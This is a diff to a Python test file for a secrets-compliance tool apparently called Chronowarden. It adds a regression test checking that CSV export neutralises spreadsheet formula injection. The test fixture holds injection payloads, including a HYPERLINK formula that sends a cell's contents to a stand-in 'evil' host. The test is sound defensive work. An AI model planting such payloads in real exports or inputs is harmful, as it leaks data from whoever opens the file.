@@ -194,7 +194,9 @@ class TestSnapshots:
         assert (
             row["owners"] == ["Alice"] and row["privileged"] is True and row["last_rotation"] == "2026-01-01T00:00:00Z"
         )
-        assert document["audit"]["events"] == len(db.iter_audit_events()) - 1, "head before the snapshot's own event"
+        assert (
+            document["audit"]["events"] == len(list(db.iter_audit_events())) - 1
+        ), "head before the snapshot's own event"
         csv_text = client.get(f"/api/v1/compliance/snapshots/{info['id']}.csv").text
         assert csv_text.splitlines()[0].startswith("vault,engine,path") and "Alice" in csv_text
         assert db.list_audit_events(event_type="compliance.snapshot")[0]["subject"] == f"snapshot:{info['id']}"
@@ -261,3 +263,26 @@ def test_settings_view_has_no_addresses_or_credentials(client: TestClient) -> No
     assert data["confirmation_grace"] == "7d"
     assert data["confirmation_required"] == [{"vault": "prod", "required": None, "engines": []}]
     assert "http://v:8200" not in json.dumps(data) and "token" not in json.dumps(data)
+
+
+def test_csv_export_neutralises_formulas() -> None:
+    """Regression (0.7.1): names typed into Chronowarden could run as spreadsheet formulas in the CSV export."""
+    from chronowarden.compliance.evidence import rows_to_csv
+
+    row = {
+        "vault": "prod",
+        "engine": "apps",
+        "path": "=1+1",
+        "severity": "default",
+        "status": "ok",
+        "ttl_date": None,
+        "last_rotation": None,
+        "privileged": False,
+        "removed_at": None,
+        "last_confirmed_applied_at": None,
+        "awaiting_confirmation": None,
+        "owners": ["@evil", "Alice"],
+        "system": {"name": '=HYPERLINK("https://evil/?"&A2,"x")', "cmdb_uri": None, "asset_number": "-1"},
+    }
+    lines = rows_to_csv([row]).splitlines()
+    assert "'=1+1" in lines[1] and "'=HYPERLINK" in lines[1] and "'-1" in lines[1] and "'@evil; Alice" in lines[1]
